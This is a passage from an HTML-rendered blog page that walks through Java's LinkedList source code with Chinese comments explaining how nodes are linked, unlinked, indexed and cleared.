class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedList</span>&lt;<span class="title">E</span>&gt; <span class="keyword">extends</span> <span class="title">AbstractSequentialList</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">List</span>&lt;<span class="title">E</span>&gt;, <span class="title">Deque</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList的元素个数：</span></span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">int</span> size = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList的头结点：Node内部类</span></span><br><span class="line">    <span class="keyword">transient</span> java.util.LinkedList.Node&lt;E&gt; first;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList尾结点：Node内部类</span></span><br><span class="line">    <span class="keyword">transient</span> java.util.LinkedList.Node&lt;E&gt; last;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//空实现：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用添加方法：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedList</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>();</span><br><span class="line">        addAll(c);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//LinkedList添加首结点 first：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        linkFirst(e);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//first节点插入新元素：addFirst()调用</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">linkFirst</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//头结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="comment">//创建一个新节点，并指向头结点f：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(<span class="keyword">null</span>, e, f);</span><br><span class="line">        <span class="comment">//将新节点赋值给头几点：</span></span><br><span class="line">        first = newNode;</span><br><span class="line">        <span class="comment">//如果头节点为null，则是第一个元素插入，将新节点也设置为尾结点；</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">            last = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//将之前的头结点的前指针指向新的结点：</span></span><br><span class="line">            f.prev = newNode;</span><br><span class="line">        <span class="comment">//长度+1</span></span><br><span class="line">        size++;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加元素：添加到最后一个结点；</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">add</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        linkLast(e);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加最后一个结点 last：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">addLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        linkLast(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//last节点插入新元素：addLast()调用</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">linkLast</span><span class="params">(E e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//将尾结点赋值个体L:</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="comment">//创建新的结点，将新节点的前指针指向l:</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(l, e, <span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">//新节点置为尾结点：</span></span><br><span class="line">        last = newNode;</span><br><span class="line">        <span class="comment">//如果尾结点l为null：则是空集合新插入</span></span><br><span class="line">        <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">            <span class="comment">//头结点也置为 新节点：</span></span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//l节点的后指针指向新节点：</span></span><br><span class="line">            l.next = newNode;</span><br><span class="line">        <span class="comment">//长度+1</span></span><br><span class="line">        size++;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//向对应角标添加元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查传入的角标 是否正确：</span></span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        <span class="comment">//如果插入角标==集合长度，则插入到集合的最后面：</span></span><br><span class="line">        <span class="keyword">if</span> (index == size)</span><br><span class="line">            linkLast(element);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//插入到对应角标的位置：获取此角标下的元素先</span></span><br><span class="line">            linkBefore(element, node(index));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//在succ前插入 新元素e：</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">linkBefore</span><span class="params">(E e, java.util.LinkedList.Node&lt;E&gt; succ)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取被插入元素succ的前指针元素：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; pred = succ.prev;</span><br><span class="line">        <span class="comment">//创建新增元素节点，前指针 和 后指针分别指向对应元素：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(pred, e, succ);</span><br><span class="line">        succ.prev = newNode;</span><br><span class="line">        <span class="comment">//succ的前指针元素可能为null，为null的话说明succ是头结点，则把新建立的结点置为头结点：</span></span><br><span class="line">        <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">            first = newNode;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//succ前指针不为null，则将前指针的结点的后指针指向新节点：</span></span><br><span class="line">            pred.next = newNode;</span><br><span class="line">        <span class="comment">//长度+1</span></span><br><span class="line">        size++;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//移除首个结点：如果集合还没有元素则报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="comment">//首节点为null，则抛出异常；</span></span><br><span class="line">        <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="keyword">return</span> unlinkFirst(f);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除LinkedList的头结点：removeFirst()方法调用</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> E <span class="title">unlinkFirst</span><span class="params">(java.util.LinkedList.Node&lt;E&gt; f)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//f为头结点：获取头结点元素E</span></span><br><span class="line">        <span class="keyword">final</span> E element = f.item;</span><br><span class="line">        <span class="comment">//获取头结点的尾指针结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; next = f.next;</span><br><span class="line">        <span class="comment">//将头结点元素置为null：</span></span><br><span class="line">        f.item = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//头结点尾指针置为null：</span></span><br><span class="line">        f.next = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//将头结点的尾指针指向的结点next置为first</span></span><br><span class="line">        first = next;</span><br><span class="line">        <span class="comment">//尾指针指向结点next为null的话，就将尾结点也置为null（LinkedList中只有一个元素时出现）</span></span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>)</span><br><span class="line">            last = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="comment">//将尾指针指向结点next的 前指针置为null；</span></span><br><span class="line">            next.prev = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">// 长度减1</span></span><br><span class="line">        size--;</span><br><span class="line">        <span class="comment">//操作数+1</span></span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="comment">//返回被删除的元素：</span></span><br><span class="line">        <span class="keyword">return</span> element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//移除最后一个结点：如果集合还没有元素则报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">removeLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取最后一个结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="comment">//删除尾结点：</span></span><br><span class="line">        <span class="keyword">return</span> unlinkLast(l);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//删除LinkedList的尾结点：removeLast()方法调用</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> E <span class="title">unlinkLast</span><span class="params">(java.util.LinkedList.Node&lt;E&gt; l)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">final</span> E element = l.item;</span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; prev = l.prev;</span><br><span class="line">        l.item = <span class="keyword">null</span>;</span><br><span class="line">        l.prev = <span class="keyword">null</span>; <span class="comment">// help GC</span></span><br><span class="line">        last = prev;</span><br><span class="line">        <span class="keyword">if</span> (prev == <span class="keyword">null</span>)</span><br><span class="line">            first = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            prev.next = <span class="keyword">null</span>;</span><br><span class="line">        size--;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除LinkedList中的元素，可以删除为null的元素，逐个遍历LinkedList的元素；</span></span><br><span class="line">    <span class="comment">//重复元素只删除第一个：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">remove</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//如果删除元素为null：</span></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (x.item == <span class="keyword">null</span>) &#123;</span><br><span class="line">                    unlink(x);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//如果删除元素不为null：</span></span><br><span class="line">            <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; x = x.next) &#123;</span><br><span class="line">                <span class="keyword">if</span> (o.equals(x.item)) &#123;</span><br><span class="line">                    unlink(x);</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//移除LinkedList结点：remove()方法中调用</span></span><br><span class="line">    <span class="function">E <span class="title">unlink</span><span class="params">(java.util.LinkedList.Node&lt;E&gt; x)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取被删除结点的元素E：</span></span><br><span class="line">        <span class="keyword">final</span> E element = x.item;</span><br><span class="line">        <span class="comment">//获取被删除元素的后指针结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; next = x.next;</span><br><span class="line">        <span class="comment">//获取被删除元素的前指针结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; prev = x.prev;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//被删除结点的 前结点为null的话：</span></span><br><span class="line">        <span class="keyword">if</span> (prev == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="comment">//将后指针指向的结点置为头结点</span></span><br><span class="line">            first = next;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//前置结点的  尾结点指向被删除的next结点；</span></span><br><span class="line">            prev.next = next;</span><br><span class="line">            <span class="comment">//被删除结点前指针置为null:</span></span><br><span class="line">            x.prev = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对尾结点同样处理：</span></span><br><span class="line">        <span class="keyword">if</span> (next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            last = prev;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            next.prev = prev;</span><br><span class="line">            x.next = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        x.item = <span class="keyword">null</span>;</span><br><span class="line">        size--;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> element;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到首个结点：集合没有元素报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getFirst</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取first结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; f = first;</span><br><span class="line">        <span class="keyword">if</span> (f == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="keyword">return</span> f.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//得到最后一个结点：集合没有元素报错</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">getLast</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//获取last结点：</span></span><br><span class="line">        <span class="keyword">final</span> java.util.LinkedList.Node&lt;E&gt; l = last;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> NoSuchElementException();</span><br><span class="line">        <span class="keyword">return</span> l.item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断obj 是否存在：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">contains</span><span class="params">(Object o)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> indexOf(o) != -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//LinkedList长度：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">size</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//添加集合：从最后size所在的index开始：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> addAll(size, c);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//LinkedList添加集合：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">addAll</span><span class="params">(<span class="keyword">int</span> index, Collection&lt;? extends E&gt; c)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查角标是否正确：</span></span><br><span class="line">        checkPositionIndex(index);</span><br><span class="line">        Object[] a = c.toArray();</span><br><span class="line">        <span class="keyword">int</span> numNew = a.length;</span><br><span class="line">        <span class="keyword">if</span> (numNew == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; pred, succ;</span><br><span class="line">        <span class="keyword">if</span> (index == size) &#123;</span><br><span class="line">            succ = <span class="keyword">null</span>;</span><br><span class="line">            pred = last;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            succ = node(index);</span><br><span class="line">            pred = succ.prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (Object o : a) &#123;</span><br><span class="line">            E e = (E) o;</span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; newNode = <span class="keyword">new</span> java.util.LinkedList.Node&lt;&gt;(pred, e, <span class="keyword">null</span>);</span><br><span class="line">            <span class="keyword">if</span> (pred == <span class="keyword">null</span>)</span><br><span class="line">                first = newNode;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                pred.next = newNode;</span><br><span class="line">            pred = newNode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (succ == <span class="keyword">null</span>) &#123;</span><br><span class="line">            last = pred;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            pred.next = succ;</span><br><span class="line">            succ.prev = pred;</span><br><span class="line">        &#125;</span><br><span class="line">        size += numNew;</span><br><span class="line">        modCount++;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//清空LinkedList：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">clear</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//遍历LinedList集合：</span></span><br><span class="line">        <span class="keyword">for</span> (java.util.LinkedList.Node&lt;E&gt; x = first; x != <span class="keyword">null</span>; ) &#123;</span><br><span class="line">            <span class="comment">//将每个结点的前指针 尾指针  元素都置为null：</span></span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; next = x.next;</span><br><span class="line">            x.item = <span class="keyword">null</span>;</span><br><span class="line">            x.next = <span class="keyword">null</span>;</span><br><span class="line">            x.prev = <span class="keyword">null</span>;</span><br><span class="line">            x = next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//头尾结点 都置为null：</span></span><br><span class="line">        first = last = <span class="keyword">null</span>;</span><br><span class="line">        <span class="comment">//长度置为0</span></span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">//操作数+1：</span></span><br><span class="line">        modCount++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取相应角标的元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">get</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//检查角标是否正确：</span></span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="comment">//获取角标所属结点的 元素值：</span></span><br><span class="line">        <span class="keyword">return</span> node(index).item;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//设置对应角标的元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">set</span><span class="params">(<span class="keyword">int</span> index, E element)</span> </span>&#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        java.util.LinkedList.Node&lt;E&gt; x = node(index);</span><br><span class="line">        E oldVal = x.item;</span><br><span class="line">        x.item = element;</span><br><span class="line">        <span class="keyword">return</span> oldVal;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//删除对应角标的元素：</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> E <span class="title">remove</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        checkElementIndex(index);</span><br><span class="line">        <span class="keyword">return</span> unlink(node(index));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//获取对应角标所属于的结点：</span></span><br><span class="line">    java.util.LinkedList.<span class="function">Node&lt;E&gt; <span class="title">node</span><span class="params">(<span class="keyword">int</span> index)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//位运算：如果位置索引小于列表长度的一半，从前面开始遍历；否则，从后面开始遍历；</span></span><br><span class="line">        <span class="keyword">if</span> (index &lt; (size &gt;&gt; <span class="number">1</span>)) &#123;</span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; x = first;</span><br><span class="line">            <span class="comment">//从头结点开始遍历：遍历的长度就是index的长度，获取对应的index的元素</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; index; i++)</span><br><span class="line">                x = x.next;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">//从集合尾结点遍历：</span></span><br><span class="line">            java.util.LinkedList.Node&lt;E&gt; x = last;</span><br><span class="line">            <span class="comment">//同样道理：</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = size - <span class="number">1</span>; i &gt; index; i--)</span><br><span class="line">                x = x.prev;</span><br><span class="line">            <span class="keyword">return</span> x;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 左移相当于*2，只是要注意边界问题。如char a = 65； a&lt;&lt;1 按照*2来算为130;</span></span><br><span class="line">    <span class="comment">// 但有符号char的取值范围-128~127，已经越界，多超出了3个数值，</span></span><br><span class="line">    <span class="comment">// 所以从-128算起的第三个数值-126才是a&lt;&lt;1的正确结果。</span></span><br><span class="line">    <span class="comment">//而右移相当于除以2，只是要注意移位比较多的时候结果会趋近去一个非常小的数，如上面结果中的-1，0。</span></span><br><span class="line"></span><br><span class="line">    <span 